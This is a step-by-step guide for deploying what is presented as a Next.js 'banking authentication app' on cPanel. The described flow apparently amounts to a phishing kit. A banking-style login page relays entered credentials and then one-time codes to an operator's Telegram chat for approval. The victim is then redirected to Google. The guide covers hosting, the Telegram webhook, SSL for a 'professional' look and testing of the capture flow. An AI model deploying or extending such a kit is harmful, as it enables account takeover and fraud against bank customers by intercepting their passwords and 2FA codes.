# 🚀 Complete cPanel Deployment Guide

This guide will walk you through deploying your Next.js banking authentication app on cPanel hosting.

## 📋 Prerequisites

- cPanel hosting account with Node.js support
- Domain name configured
- Telegram Bot Token and Chat ID
- SSH access (recommended) or File Manager access

## 🔧 Step 1: Prepare Your Application

### 1.1 Update Configuration

First, ensure your `src/config/cpanel-config.js` has the correct values:

```javascript
// src/config/cpanel-config.js
const CPANEL_CONFIG = {
  // Your Telegram Bot Token (get from @BotFather)
  TELEGRAM_BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",

  // Your Telegram Chat ID (get from @userinfobot)
  TELEGRAM_CHAT_ID: "YOUR_CHAT_ID_HERE",

  // Your domain (update this to your actual domain)
  APP_URL: "https://yourdomain.com",

  // Timeout settings (optional to modify)
  APPROVAL_TIMEOUT_MS: 300000, // 5 minutes
  OTP_TIMEOUT_MS: 300000, // 5 minutes
};

module.exports = CPANEL_CONFIG;
```

### 1.2 Build Your Application

Run these commands locally to prepare for deployment:

```bash
# Install dependencies
npm install

# Build the production version
npm run build

# Test the build locally (optional)
npm start
```

## 🌐 Step 2: cPanel Setup

### 2.1 Enable Node.js

1. **Login to cPanel**
2. **Find "Node.js App"** in the Software section
3. **Click "Create Application"**
4. **Configure:**
   - **Node.js Version:** 18.x or higher
   - **Application Mode:** Production
   - **Application Root:** `public_html` (or your domain folder)
   - **Application URL:** Your domain
   - **Application Startup File:** `server.js`

### 2.2 Upload Your Files

**Option A: Using File Manager**

1. Go to **File Manager** in cPanel
2. Navigate to your domain's folder (usually `public_html`)
3. **Upload and extract** your project files
4. Make sure all files are in the root directory

**Option B: Using SSH (Recommended)**

```bash
# Connect to your server
ssh username@yourdomain.com

# Navigate to your domain folder
cd public_html

# Upload your files (use SCP, SFTP, or Git)
```

### 2.3 Install Dependencies

In cPanel Node.js App section:

1. **Click on your app**
2. **Go to "Package.json"** tab
3. **Click "Run NPM Install"**

Or via SSH:

```bash
cd public_html
npm install --production
```

## 🔧 Step 3: Configure Environment

### 3.1 Set Environment Variables (Optional)

In cPanel Node.js App:

1. **Go to "Environment Variables"**
2. **Add these variables:**
   ```
   NODE_ENV=production
   PORT=3000
   ```

### 3.2 Update Package.json Scripts

Make sure your `package.json` has these scripts:

```json
{
  "scripts": {
    "build": "next build",
    "start": "next start -p 3000",
    "dev": "next dev"
  }
}
```

## 🤖 Step 4: Setup Telegram Bot

### 4.1 Create Telegram Bot

1. **Message @BotFather** on Telegram
2. **Send:** `/newbot`
3. **Choose a name** for your bot
4. **Choose a username** (must end with 'bot')
5. **Copy the Bot Token** → Update `CPANEL_CONFIG.TELEGRAM_BOT_TOKEN`

### 4.2 Get Your Chat ID

1. **Message @userinfobot** on Telegram
2. **Send:** `/start`
3. **Copy your Chat ID** → Update `CPANEL_CONFIG.TELEGRAM_CHAT_ID`

### 4.3 Setup Webhook

**Method 1: Using the Setup Script**

```bash
# Run the webhook setup script
node scripts/setup-telegram-webhook.js
```

**Method 2: Manual Setup**
Open this URL in your browser (replace with your values):

```
https://api.telegram.org/bot[YOUR_BOT_TOKEN]/setWebhook?url=https://yourdomain.com/api/telegram-webhook/
```

**Verify Webhook:**

```
https://api.telegram.org/bot[YOUR_BOT_TOKEN]/getWebhookInfo
```

## 🚀 Step 5: Deploy and Start

### 5.1 Start the Application

In cPanel Node.js App:

1. **Click "Restart"** to start your app
2. **Check "Status"** - should show "Running"

### 5.2 Configure Domain

1. **Go to "Subdomains"** or **"Addon Domains"**
2. **Point your domain** to the Node.js app
3. **Update DNS** if needed

### 5.3 SSL Certificate (Recommended)

1. **Go to "SSL/TLS"** in cPanel
2. **Enable "Let's Encrypt"** for your domain
3. **Force HTTPS** redirect

## ✅ Step 6: Testing

### 6.1 Test the Application

1. **Visit your domain** → Should show login page
2. **Enter test credentials** → Should get Telegram message
3. **Click Approve/Reject** → Should work properly
4. **Test OTP flow** → Should get second Telegram message
5. **Complete flow** → Should redirect to Google

### 6.2 Test Telegram Integration

1. **Submit login form**
2. **Check Telegram** for approval message
3. **Click buttons** to test approval/rejection
4. **Verify OTP flow** works the same way

## 🔧 Step 7: Troubleshooting

### 7.1 Common Issues

**App Won't Start:**

- Check Node.js version (18.x+)
- Verify `package.json` scripts
- Check error logs in cPanel

**Telegram Not Working:**

- Verify Bot Token and Chat ID
- Check webhook URL is correct
- Ensure domain has SSL certificate

**Build Errors:**

- Run `npm run build` locally first
- Check for missing dependencies
- Verify Next.js configuration

### 7.2 Check Logs

In cPanel Node.js App:

- **Click on your app**
- **Go to "Logs"** tab
- **Check for errors**

### 7.3 Debug Mode

Temporarily enable debug mode:

```javascript
// Add to your config
DEBUG: true,
```

## 🔒 Step 8: Security & Maintenance

### 8.1 Security Checklist

- ✅ **SSL Certificate** enabled
- ✅ **Bot Token** kept secret
- ✅ **Chat ID** kept private
- ✅ **Domain** properly configured
- ✅ **Webhook** uses HTTPS

### 8.2 Regular Maintenance

- **Monitor logs** for errors
- **Update dependencies** regularly
- **Test approval flow** periodically
- **Backup your code** regularly

## 📱 Step 9: Final Configuration

### 9.1 Update Domain References

Make sure to update:

- `CPANEL_CONFIG.APP_URL` → Your actual domain
- Telegram webhook URL → Your domain
- Any hardcoded URLs in the code

### 9.2 Test Complete Flow

1. **Login Page** → Enter credentials
2. **Telegram** → Receive approval message
3. **Approve** → Redirect to OTP page
4. **OTP Page** → Enter 6-digit code
5. **Telegram** → Receive OTP approval message
6. **Approve** → Redirect to thank you page
7. **Thank You** → Auto-redirect to Google

## 🎉 Deployment Complete!

Your banking authentication app is now live on cPanel!

**Your app is accessible at:** `https://yourdomain.com`

**Admin receives Telegram messages for:**

- Login credential approvals
- OTP code approvals

**Users experience:**

- Professional banking-style login
- Secure OTP verification
- Automatic redirect to Google

---

## 📞 Support

If you encounter issues:

1. Check the troubleshooting section above
2. Review cPanel error logs
3. Test Telegram bot separately
4. Verify domain and SSL configuration

**Remember:** Keep your Bot Token and Chat ID secure and never commit them to public repositories!
